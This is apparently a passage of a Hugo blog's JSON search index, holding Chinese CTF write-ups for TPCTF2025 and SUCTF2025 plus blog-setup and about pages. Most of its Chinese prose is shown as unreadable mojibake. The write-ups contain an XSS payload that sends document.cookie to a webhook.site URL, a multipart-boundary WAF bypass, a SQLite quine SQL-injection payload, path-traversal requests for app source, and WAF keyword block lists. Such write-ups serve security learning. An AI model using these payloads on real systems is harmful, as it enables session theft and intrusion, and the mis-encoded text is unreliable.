‡ç­¾éƒ½å°†è¢«è¿‡æ»¤ã€‚ä½†æ˜¯ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä»…æ£€æŸ¥ /\u003c[/\\ w]/ ï¼Œå› æ­¤ä¸ä¼šè¿‡æ»¤ \u003c{{content}} ï¼Œå¯ä»¥ç”¨å…¶æ¥ç»•è¿‡æ¶æ„çš„æ ‡ç­¾ ä½†ä¸èƒ½ç›´æ¥å†™åœ¨ style æ ‡ç­¾é‡Œï¼Œå› ä¸º style æ ‡ç­¾ä¸­çš„ä¼šè¢«å½“ä½œ css è§£æï¼Œæ‰€ä»¥æŠŠ {{content}} åŒ…è£¹åœ¨ style ä¾¿ç­¾é‡Œå³å¯ï¼Œç¬¬ä¸€ä¸ª {{content}} æ˜¯ç”¨æ¥é—­åˆç¬¬ä¸€ä¸ª style æ ‡ç­¾çš„ï¼Œè€Œå‰é¢çš„ a çš„è¯æ˜¯å¼€ä¸€ä¸ªæ–°çš„èŠ‚ç‚¹ï¼Œå¹²æ‰°htmlè§£æè§„åˆ™å•¥çš„ï¼Œæ²¡å¤ªæ‡‚ï¼Œä½†æ˜¯ä¸åŠ å°±ä¼šè§£æå¤±è´¥ layout a\u003cstyle\u003e{{content}}\u003c{{content}}\u003c/style\u003e content img src=\"a\" onerror=fetch(`https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=`+document.cookie) \u003cstyle\u003e\u003c/style\u003e ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:3","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"supersqli\rmanage.py åŠ ä¸ªå‚æ•°å¯åŠ¨æœåŠ¡å™¨ï¼Œæ–¹ä¾¿è°ƒè¯• if len(sys.argv) == 1: sys.argv.append(\"runserver\") åœ¨ supersqli\\web_deploy\\src\\blog\\views.py æ–‡ä»¶ä¸­çš„ flag å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨ sql æ³¨å…¥ ä½†æ˜¯ supersqli\\web_deploy\\simplewaf\\main.go ä¸­çš„ waf é™åˆ¶çš„å¾ˆæ­» var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\\s+table|--|#|\\*\\/|\\/\\*)`) var rcePattern = regexp.MustCompile(`(?i)(\\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\\s*\\(.+\\))`) var hotfixPattern = regexp.MustCompile(`(?i)(select)`) æ³¨æ„åˆ°åœ¨ go ä¸­åŠ äº†ä¸ªåˆ¤æ–­ï¼Œåˆ¤æ–­ mediaType æ˜¯å¦ä¸º multipart/form-data æ‰¾åˆ°ä¸€ç¯‡æœ‰å…³åˆ©ç”¨ multipart/form-data è§£æå·®å¼‚å®ç°ç»•è¿‡çš„æ–‡ç« ï¼šhttps://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/ ä½†æ–‡ç« ä¸­ç”¨çš„æ˜¯ flask æ¡†æ¶ï¼Œè²Œä¼¼åœ¨è¿™é‡Œçš„ Django ä¸­è¡Œä¸é€šï¼Œçœ‹ä¸‹ Django æ¡†æ¶ä¸­å¯¹ multipart/form-data å¤„ç†ï¼Œè·Ÿè¿›åˆ° multipartparser.py ä¸­å¯ä»¥å‘ç° Django æ˜¯é€šè¿‡è¯·æ±‚å¤´ä¸­çš„ Content-Disposition å­—æ®µæ¥åŒºåˆ†æ¯ä¸ªå­—æ®µ è€Œåœ¨ go ä¸­çš„ request.go çš„ multipartReader å‡½æ•°ä¸­ func (r *Request) multipartReader(allowMixed bool) (*multipart.Reader, error) { v := r.Header.Get(\"Content-Type\") if v == \"\" { return nil, ErrNotMultipart } if r.Body == nil { return nil, errors.New(\"missing form body\") } d, params, err := mime.ParseMediaType(v) if err != nil || !(d == \"multipart/form-data\" || allowMixed \u0026\u0026 d == \"multipart/mixed\") { return nil, ErrNotMultipart } boundary, ok := params[\"boundary\"] if !ok { return nil, ErrMissingBoundary } return multipart.NewReader(r.Body, boundary), nil } å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ç”¨ boundary çš„å€¼æ¥åˆ†éš” multipart è¯·æ±‚ä¸­çš„å„ä¸ªéƒ¨åˆ†ï¼Œæˆªæ­¢ç¬¦çš„è¯å½“ç„¶å°±æ˜¯ boundary çš„å€¼åŠ ä¸Š -- äº† ç»è¿‡ä¸Šé¢çš„åˆ†ææˆ‘ä»¬å‘ç° go å’Œ Django ä¸­ç”¨æ¥åŒºåˆ†ä¸åŒå­—æ®µçš„æ–¹æ³•æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªè§£æå·®å¼‚æ¥ç»•è¿‡ waf ï¼Œè¯·æ±‚æ˜¯å…ˆç»è¿‡ go å¤„ç†å†ç»è¿‡ Django çš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç”¨ --boundary-- æ¥æˆªæ­¢ï¼Œç„¶åå†ä¼  password çš„å€¼ã€‚å½“è¯·æ±‚ä½“ä¸º Content-Type: multipart/form-data; boundary=----xxx Content-Length: 137 ------xxx Content-Disposition: form-data; name=\"username\" admin ------xxx-- Content-Disposition: form-data; name=\"password\"; 111 go åªä¼šè§£æ ------xxx-- å‰çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¿”å› è¯·æ±‚çš„ POST å‚æ•°: username = admin è€Œ Django åˆ™ä¼šè¿”å›ä¸¤ä¸ªå‚æ•°çš„å€¼ è¯·æ±‚çš„ POST å‚æ•°: username = admin password = 111 åé¢ sql æ³¨å…¥çš„è¯æ˜¯æ‰“ sqliteï¼Œç›²æ³¨ä¸çŸ¥é“ä¸ºå•¥æ‰“ä¸äº†ï¼Œç„¶åå‘ç°èƒ½æ‰“ quine æ³¨å…¥ï¼Œè¿™é‡Œåªåˆ¤æ–­äº†ä¼ å…¥çš„ password æ˜¯å¦ç›¸åŒï¼Œç¡®å®ä¹Ÿæ¯”è¾ƒç¬¦åˆå…¶åˆ©ç”¨åœºæ™¯ï¼Œç”¨æ–‡ç« ä¸­çš„è„šæœ¬æ„é€ ä¸‹ payloadï¼šhttps://blog.csdn.net/qq_35782055/article/details/130348274ï¼Œç¨å¾®æ”¹ä¸‹ï¼Œæ²¡è¿‡æ»¤ç©ºæ ¼ï¼Œä¸ç”¨ repalce ä¸º /**/ sql = input (\"è¾“å…¥ä½ çš„sqlè¯­å¥,ä¸ç”¨å†™å…³é”®æŸ¥è¯¢çš„ä¿¡æ¯ å½¢å¦‚ 1'union select #\\n\") sql2 = sql.replace(\"'\",'\"') base = \"replace(replace('.',char(34),char(39)),char(46),'.')\" final = \"\" def add(string): if (\"--+\" in string): tem = string.split(\"--+\")[0] + base + \"--+\" if (\"#\" in string): tem = string.split(\"#\")[0] + base + \"#\" return tem def patch(string,sql): if (\"--+\" in string): return sql.split(\"--+\")[0] + string + \"--+\" if (\"#\" in string): return sql.split(\"#\")[0] + string + \"#\" res = patch(base.replace(\".\",add(sql2)),sql).replace(\"'.'\",'\".\"') print(res) æœ€åç»å°è¯•å‘ç°æ˜¯ä¸¤åˆ—ï¼Œå› æ­¤ä¼ å…¥ 1' union select 1,2,--+ ï¼Œå¾—åˆ° payload 1' union select 1,2,replace(replace('1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+',char(34),char(39)),char(46),'1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+')--+ ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:4","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"å‰è¨€\rå¥½å¤šé¢˜ï¼Œè´¨é‡å¾ˆé«˜ï¼Œmiscæ²¡æ€ä¹ˆçœ‹ï¼Œå…¨åœ¨çœ‹webï¼ŒJavaè¿˜æ˜¯æ‰“ä¸åŠ¨ğŸ˜¿ï¼Œè¿˜æœ‰ä¸€äº›å…³äºäº‘çš„ï¼Œä¹Ÿä¸ä¼šï¼Œå…ˆè´´ä¸€ä¸‹å†™äº†çš„wpï¼Œpopå½“æ—¶æ²¡åšï¼Œå…¶ä»–é¢˜ä¹‹åæœ‰ç©ºå¤ç°ä¸€ä¸‹ ","date":"2025-01-14","objectID":"/posts/48766ef/:1:0","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Misc\r","date":"2025-01-14","objectID":"/posts/48766ef/:2:0","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_checkin\ræ‰¾åˆ°ä¸ªpasswordï¼šSePassWordLen23SUCT åŠ å¯†æ–¹å¼ï¼šPBEWithMD5AndDES æ„Ÿè§‰hackerè¿™ä¸ªç”¨æˆ·é‡Œçš„å¯†ç å°±æ˜¯ç›ï¼Œä½†æ˜¯çˆ†ç ´å‡ºæ¥æ˜¯ hackerï¼ˆæ€ä¹ˆä¸æ˜¯8ä½ï¼‰ è¿­ä»£æ¬¡æ•°åº”è¯¥æ˜¯é»˜è®¤çš„1000ï¼Œä¸è¡Œçš„è¯çˆ†ç ´ä¹Ÿè¡Œï¼ŒOUTPUTåº”è¯¥å°±æ˜¯å¯†æ–‡ï¼šElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg= åæ¥å‘ç°ä¸ç”¨ç›ä¹Ÿå¯ä»¥è§£å¯†ï¼Œå¯†ç SePassWordLen23SUCTå…¶å®æ˜¯æš—ç¤ºå¯†ç lengthä¸º23ï¼Œå…¶å®åº”è¯¥æ˜¯SUCTFï¼Œç…§ç€åŠ å¯†è„šæœ¬ï¼šhttps://blog.csdn.net/iin729/article/details/128432332ï¼Œå«aiå†™äº†ä¸ªpythonè§£å¯†è„šæœ¬ import base64 import hashlib import re import itertools import string from Crypto.Cipher import DES def get_derived_key(password, salt, count): key = password + salt for i in range(count): m = hashlib.md5(key) key = m.digest() return (key[:8], key[8:]) def decrypt(msg, password): msg_bytes = base64.b64decode(msg) salt = msg_bytes[:8] enc_text = msg_bytes[8:] (dk, iv) = get_derived_key(password, salt, 1000) crypter = DES.new(dk, DES.MODE_CBC, iv) text = crypter.decrypt(enc_text) # Remove padding at the end, if any return re.sub(r'[\\x01-\\x08]', '', text.decode(\"utf-8\", errors=\"ignore\")) def brute_force_decrypt(ciphertext, prefix, length, charset): # Calculate the number of missing characters missing_length = length - len(prefix) # Generate all possible combinations of the missing characters for combination in itertools.product(charset, repeat=missing_length): # Construct the full password password = prefix + ''.join(combination) try: # Attempt to decrypt the ciphertext decrypted_text = decrypt(ciphertext, password.encode(\"utf-8\")) # Check if the decrypted text contains \"SUCTF\" if \"SUCTF\" in decrypted_text: print(f\"Found valid password: {password}\") print(f\"Decrypted text: {decrypted_text}\") return password, decrypted_text except Exception as e: # If decryption fails, just continue to the next combination continue print(\"No valid password found.\") return None, None def main(): # Known prefix of the password prefix = \"SePassWordLen23SUCTF\" # Total length of the password length = 23 # Character set to use for the missing characters (alphanumeric) charset = string.ascii_letters + string.digits # Ciphertext to decrypt ciphertext = \"ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=\" # Start brute-forcing password, decrypted_text = brute_force_decrypt(ciphertext, prefix, length, charset) if password: print(f\"Success! Password: {password}\") print(f\"Decrypted text: {decrypted_text}\") if __name__ == \"__main__\": main() ","date":"2025-01-14","objectID":"/posts/48766ef/:2:1","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_RealCheckin\rhello ctf -\u003e ğŸ ğŸ¦…ğŸ‹ğŸ‹ğŸŠ ğŸˆğŸŒ®ğŸŸ $flag -\u003e ğŸâ˜‚ï¸ğŸˆğŸŒ®ğŸŸ{ğŸ‹ğŸ¦…ğŸ‹ğŸˆğŸŠğŸ”ï¸ğŸ¦…_ğŸŒ®ğŸŠ_ğŸâ˜‚ï¸ğŸˆğŸŒ®ğŸŸ_ğŸ§¶ğŸŠâ˜‚ï¸_ğŸˆğŸğŸŒƒ_ğŸŒˆğŸ¦…ğŸğŸ‹ğŸ‹ğŸ§¶_ğŸ¬ğŸğŸŒƒğŸˆğŸ¦…} $flag å‰äº”ä¸ªä¸ºsuctfï¼Œæ ¹æ®æ˜ å°„å…³ç³»æœ€åå¤§æ‹¬å·é‡Œé¢çš„æ¨æ–­å‡ºæ¥æ˜¯ ? e l c o ? e _ t o _ s u c t f _ ? o u _ c ? ? _ r e ? l l ? _ d ? ? c e å…¶å®ç¬¬ä¸€æ®µå¾ˆæ˜æ˜¾æ˜¯welcomeï¼Œå¯ä»¥å‘ç°è¯¥emojiä»£è¡¨çš„ä¸œè¥¿çš„è‹±æ–‡é¦–å­—æ¯å°±æ˜¯è¯¥emojiä»£è¡¨çš„å­—ç¬¦ï¼Œæ•…æœ€åflagä¸º suctf{welcome_to_suctf_you_can_really_dance} ","date":"2025-01-14","objectID":"/posts/48766ef/:2:2","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Web\r","date":"2025-01-14","objectID":"/posts/48766ef/:3:0","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_blog\rarticles ç›®å½•æœ‰ç›®å½•ç©¿è¶Šï¼Œè¯»å¯åŠ¨å‘½ä»¤ï¼ŒåŒå†™ç»•è¿‡ä¸€ä¸‹ article?file=articles/....//....//....//....//....//....//proc/self/cmdline æ‹¿åˆ°pythonapp/app.pyï¼Œæ‹¿æºç  article?file=articles/....//....//app/app.py æºç  from flask import * import time,os,json,hashlib from pydash import set_ from waf import pwaf,cwaf app = Flask(__name__) app.config['SECRET_KEY'] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\"testuser\": \"password\"} BASE_DIR = '/var/www/html/myblog/app' articles = { 1: \"articles/article1.txt\", 2: \"articles/article2.txt\", 3: \"articles/article3.txt\" } friend_links = [ {\"name\": \"bkf1sh\", \"url\": \"https://ctf.org.cn/\"}, {\"name\": \"fushuling\", \"url\": \"https://fushuling.com/\"}, {\"name\": \"yulate\", \"url\": \"https://www.yulate.com/\"}, {\"name\": \"zimablue\", \"url\": \"https://www.zimablue.life/\"}, {\"name\": \"baozongwi\", \"url\": \"https://baozongwi.xyz/\"}, ] class User(): def __init__(self): pass user_data = User() @app.route('/') def index(): if 'username' in session: return render_template('blog.html', articles=articles, friend_links=friend_links) return redirect(url_for('login')) @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username in users and users[username] == password: session['username'] = username return redirect(url_for('index')) else: return \"Invalid credentials\", 403 return render_template('login.html') @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] users[username] = password return redirect(url_for('login')) return render_template('register.html') @app.route('/change_password', methods=['GET', 'POST']) def change_password(): if 'username' not in session: return redirect(url_for('login')) if request.method == 'POST': old_password = request.form['old_password'] new_password = request.form['new_password'] confirm_password = request.form['confirm_password'] if users[session['username']] != old_password: flash(\"Old password is incorrect\", \"error\") elif new_password != confirm_password: flash(\"New passwords do not match\", \"error\") else: users[session['username']] = new_password flash(\"Password changed successfully\", \"success\") return redirect(url_for('index')) return render_template('change_password.html') @app.route('/friendlinks') def friendlinks(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) return render_template('friendlinks.html', links=friend_links) @app.route('/add_friendlink', methods=['POST']) def add_friendlink(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) name = request.form.get('name') url = request.form.get('url') if name and url: friend_links.append({\"name\": name, \"url\": url}) return redirect(url_for('friendlinks')) @app.route('/delete_friendlink/\u003cint:index\u003e') def delete_friendlink(index): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) if 0 \u003c= index \u003c len(friend_links): del friend_links[index] return redirect(url_for('friendlinks')) @app.route('/article') def article(): if 'username' not in session: return redirect(url_for('login')) file_name = request.args.get('file', '') if not file_name: return render_template('article.html', file_name='', content=\"æœªæä¾›æ–‡ä»¶åã€‚\") blacklist = [\"waf.py\"] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template('article.html', file_name=file_name, content=\"å¤§é»‘é˜”ä¸è®¸çœ‹\") if not file_name.startswith('articles/'): return render_template('article.html', file_name=file_name, content=\"æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\") if file_name not in articles.values(): if session.get('username') != 'admin': return render_template('article.html', file_name=file_name, content=\"æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\") file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace('../', '') try: with open(file_path, 'r', encoding='ut","date":"2025-01-14","objectID":"/posts/48766ef/:3:1","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_photogallery\r404é¡µé¢ å‚è€ƒ [FSCTF 2023]ç­¾åˆ°plus å°è¯•æ‰“ä¸‹ phpï¼œ= 7 . 4 . 21 development serveræºç æ³„éœ²ï¼Œå…¶å®éšä¾¿è®¿é—®ä¸€ä¸‹å°±å‡ºæºç äº† unzip.php \u003c?php error_reporting(0); function get_extension($filename){ return pathinfo($filename, PATHINFO_EXTENSION); } function check_extension($filename,$path){ $filePath = $path . DIRECTORY_SEPARATOR . $filename; if (is_file($filePath)) { $extension = strtolower(get_extension($filename)); if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) { if (!unlink($filePath)) { // echo \"Fail to delete file: $filename\\n\"; return false; } else{ // echo \"This file format is not supported:$extension\\n\"; return false; } } else{ return true; } } else{ // echo \"nofile\"; return false; } } function file_rename ($path,$file){ $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file); $oldPath = $path . DIRECTORY_SEPARATOR . $file; $newPath = $path . DIRECTORY_SEPARATOR . $randomName; if (!rename($oldPath, $newPath)) { unlink($path . DIRECTORY_SEPARATOR . $file); // echo \"Fail to rename file: $file\\n\"; return false; } else{ return true; } } function move_file($path,$basePath){ foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) { $destination = $basePath . DIRECTORY_SEPARATOR . basename($file); if (!rename($file, $destination)){ // echo \"Fail to rename file: $file\\n\"; return false; } } return true; } function check_base($fileContent){ $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info']; $base64_keywords = []; foreach ($keywords as $keyword) { $base64_keywords[] = base64_encode($keyword); } foreach ($base64_keywords as $base64_keyword) { if (strpos($fileContent, $base64_keyword)!== false) { return true; } else{ return false; } } } function check_content($zip){ for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (preg_match('/\\.\\.(\\/|\\.|%2e%2e%2f)/i', $fileName)) { return false; } // echo \"Checking file: $fileName\\n\"; $fileContent = $zip-\u003egetFromName($fileName); if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) { // echo \"Don't hack me!\\n\"; return false; } else { continue; } } return true; } function unzip($zipname, $basePath) { $zip = new ZipArchive; if (!file_exists($zipname)) { // echo \"Zip file does not exist\"; return \"zip_not_found\"; } if (!$zip-\u003eopen($zipname)) { // echo \"Fail to open zip file\"; return \"zip_open_failed\"; } if (!check_content($zip)) { return \"malicious_content_detected\"; } $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999)); $path = $basePath . DIRECTORY_SEPARATOR . $randomDir; if (!mkdir($path, 0777, true)) { // echo \"Fail to create directory\"; $zip-\u003eclose(); return \"mkdir_failed\"; } if (!$zip-\u003eextractTo($path)) { // echo \"Fail to extract zip file\"; $zip-\u003eclose(); } for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (!check_extension($fileName, $path)) { // echo \"Unsupported file extension\"; continue; } if (!file_rename($path, $fileName)) { // echo \"File rename failed\"; continue; } } if (!move_file($path, $basePath)) { $zip-\u003eclose(); // echo \"Fail to move file\"; return \"move_failed\"; } rmdir($path); $zip-\u003eclose(); return true; } $uploadDir = __DIR__ . DIRECTORY_SEPARATOR . 'upload/suimages/'; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); } if (isset($_FILES['file']) \u0026\u0026 $_FILES['file']['error'] === UPLOAD_ERR_OK) { $uploadedFile = $_FILES['file']; $zipname = $uploadedFile['tmp_name']; $path = $uploadDir; $result = unzip($zipname, $path); if ($result === true) { header(\"Location: index.html?status=success\"); exit(); } else { header(\"Loca","date":"2025-01-14","objectID":"/posts/48766ef/:3:2","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["æ‚è®°"],"content":"å‰ç½®\rä¸‹è½½å¥½Gitã€Go å’Œ Dart Sassã€hugo Dart Sassæˆ‘è¿™ç”¨çš„npmä¸‹çš„ npm install -g sass sass --version //éªŒè¯å®‰è£… hugoä¸‹è½½ï¼šhttps://github.com/gohugoio/hugo/releasesï¼ˆä¸‹è½½extendæ‹“å±•ç‰ˆçš„ï¼Œæ–¹ä¾¿è‡ªå®šä¹‰åŠ ä¸œè¥¿ï¼Œè®°å¾—åŠ ç¯å¢ƒå˜é‡ï¼‰ å…¶ä»–æˆ‘éƒ½é…å¥½äº†ï¼Œä¸å¤šè¯´ã€‚ã€‚ ","date":"2025-01-06","objectID":"/posts/5c6225e/:1:0","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":["æ‚è®°"],"content":"åšå®¢é…ç½®\rç„¶åæŒ‰ç…§è¿™ä¸ªæ¥å§ï¼š https://fixit.lruihao.cn/zh-cn/documentation/getting-started/quick-start/ ","date":"2025-01-06","objectID":"/posts/5c6225e/:2:0","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":["æ‚è®°"],"content":"ç¾åŒ–è®°å½•ï¼ˆæŒç»­æ›´æ–°ingï¼‰\r","date":"2025-01-06","objectID":"/posts/5c6225e/:3:0","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":["æ‚è®°"],"content":"2025.2.28\ræœ‰äººå‚¬æˆ‘åŠ å‹é“¾ï¼Œäºæ˜¯å¼„ä¸‹å‹é“¾ï¼Œæ„Ÿè§‰ loveit ä¸»é¢˜å’Œ fixit ä¸»é¢˜å·®ä¸å¤šï¼ŒæŒ‰ç…§æ–‡ç« ï¼šhttps://blog.233so.com/2020/04/friend-link-shortcodes-for-hugo-loveit/ æ¥å°±å¥½ï¼Œåªéœ€è¦æ³¨æ„ä¸‹åœ¨ä¿®æ”¹FixIt/assets/css/_page/çš„_single.scssæ—¶å¼•å…¥çš„è¡Œåº”è¯¥ä¸º @import \"../_partials/_single/friend\"; fixit çš„ç›®å½•æ¯” loveit çš„ç›®å½•å°‘äº†ä¸ª s ï¼Œå…¶ä»–çš„è¯å« ai æ”¹äº†ä¸ªé¢œè‰²ï¼ŒæŠŠæ—‹è½¬å»æ‰äº†ï¼Œå†åŠ äº†ä¸ªå¾®å¾®æ”¾å¤§çš„åŠ¨ç”»ï¼Œæˆ‘çš„ friend.scss // ===== å˜é‡å®šä¹‰ ===== $shadow-green: rgba(50, 205, 50, 0.3); // ç»¿è‰²é˜´å½± $hover-green: rgba(144, 238, 144, 0.3); // æ‚¬åœèƒŒæ™¯è‰² $hover-scale: 1.02; // æ‚¬åœæ”¾å¤§æ¯”ä¾‹ $transition-time: 0.3s; // è¿‡æ¸¡åŠ¨ç”»æ—¶é—´ // ===== åŸºç¡€æ ·å¼ ===== .friendurl { text-decoration: none !important; color: black; } .myfriend { width: 56px !important; height: 56px !important; border-radius: 50%; border: 1px solid #ddd; padding: 2px; box-shadow: 1px 1px 1px rgba(0, 0, 0, 0.15); margin: 14px 0 0 14px !important; background-color: #fff; } .frienddiv { // ===== å¸ƒå±€å±æ€§ ===== height: 92px; margin-top: 10px; width: 48%; display: inline-block !important; border-radius: 5px; // ===== è§†è§‰æ•ˆæœ ===== background: rgba(255, 255, 255, 0.2); box-shadow: 4px 4px 2px 1px $shadow-green; // ===== è¿‡æ¸¡åŠ¨ç”» ===== transition: all $transition-time ease-in-out; // ===== æ‚¬åœçŠ¶æ€ ===== \u0026:hover { background: $hover-green; transform: scale($hover-scale); box-shadow: 4px 4px 6px 2px rgba(50, 205, 50, 0.25); // åŠ å¼ºé˜´å½± } // ===== å·¦ä¾§å¤´åƒåŒºåŸŸ ===== .frienddivleft { width: 92px; float: left; margin-right: 2px; } // ===== å³ä¾§æ–‡å­—åŒºåŸŸ ===== .frienddivright { margin-top: 18px; margin-right: 18px; } // ===== æ–‡å­—æ§åˆ¶ ===== .friendname, .friendinfo { text-overflow: ellipsis; overflow: hidden; white-space: nowrap; } } // ===== æ‰‹æœºç«¯é€‚é… ===== @media screen and (max-width: 600px) { .frienddiv { width: 100% !important; // å•åˆ—æ˜¾ç¤º \u0026:hover { transform: scale(1.01); // ç¼©å°æ”¾å¤§æ¯”ä¾‹ } .friendinfo { display: none; } .frienddivleft { width: 84px; margin: auto; } .frienddivright { height: 100%; margin: auto; display: flex; align-items: center; justify-content: center; } .friendname { font-size: 14px; } } } ","date":"2025-01-06","objectID":"/posts/5c6225e/:3:1","tags":["æ‚è®°"],"title":"åšå®¢æ­å»º","uri":"/posts/5c6225e/"},{"categories":null,"content":"IntroductionğŸ‘¨â€ğŸ’»\rWeb/Misc@D0g3 æƒ³å­¦æ¸—é€ï¼Œæƒ³å­¦Java ","date":"0001-01-01","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Contact meâ˜ï¸\rQQï¼šMjg2OTg3Mzk1OQ== Githubï¼šhttps://github.com/6s6-630 //å¦‚æœæœ‰é—®é¢˜æˆ–è€…æ­¤åšå®¢å›¾åºŠå´©äº†ï¼Œè¯·è”ç³»æˆ‘ï¼Œæ„Ÿè°¢ ","date":"0001-01-01","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"D0g3\r23\rgaorenyusi\rWeb\rYuy0ung\rWeb\u0026Misc\rfupanc\rWeb\rVVkladg0\rWeb\rtammy66\rWeb\rLitsasuk\rWeb\rpRism\rRe\r24\rA5trid\rWeb\r","date":"0001-01-01","objectID":"/links/:0:1","tags":null,"title":"Links","uri":"/links/"},{"categories":null,"content":"Friends\rLamentXU\rå…¨æ ˆå¤©æ‰å°‘å¹´ï¼Œå«é‡‘é‡ä¸å¤šè¯´\r","date":"0001-01-01","objectID":"/links/:0:2","tags":null,"title":"Links","uri":"/links/"}]